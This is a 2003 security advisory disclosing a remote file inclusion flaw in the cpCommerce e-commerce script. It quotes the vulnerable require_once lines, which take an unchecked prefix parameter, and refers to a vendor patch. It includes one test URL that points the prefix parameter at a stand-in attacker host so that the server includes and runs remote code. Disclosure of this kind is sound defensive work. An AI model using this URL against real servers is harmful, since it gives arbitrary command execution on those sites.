ZH2003-31SA (security advisory): file inclusion vulnerability in cpCommerce

Published: 19 October 2003
Name: cpCommerce Affected Versions: 0.05f (and other versions?)
Vendor: http://www.cpcommerce.org
Issue: file inclusion vulnerability
Author: Astharot (at Zone-H.org)

Description
**********
Zone-H Security Team has discovered a flaw in cpCommerce. cpCommerce "is an
open-source e-commerce solution that is entirely template and module based.".

Details
**********
There's a file inclusion vulnerability in the _functions.php file, line 13-14:

  require_once("{$prefix}_config.php");
  require_once("{$prefix}_gateways.php");

Is it possible for a remote attacker to include an external file and execute
arbitrary commands with the privileges of the webserver (nobody by default).

To test the vulnerability try this:

http://www.vulnsite.com/path_of_cpcommerce/_functions.php?prefix=http://www.attacker.com/index

In this way the file "http://www.attacker.com/index_config.php" or
"http://www.attacker.com/index_gateways.php" will be included and executed on
the server.

Solution
**********
The author has been contacted and he published a temporary fix in the cpCommerce
website forum, waiting for the new version.

The patch is avaible here:
http://cpcommerce.org/forums/index.php?board=2;action=display;threadid=864.

Suggestions
**********
Fix the script with the patch proposed by the author.
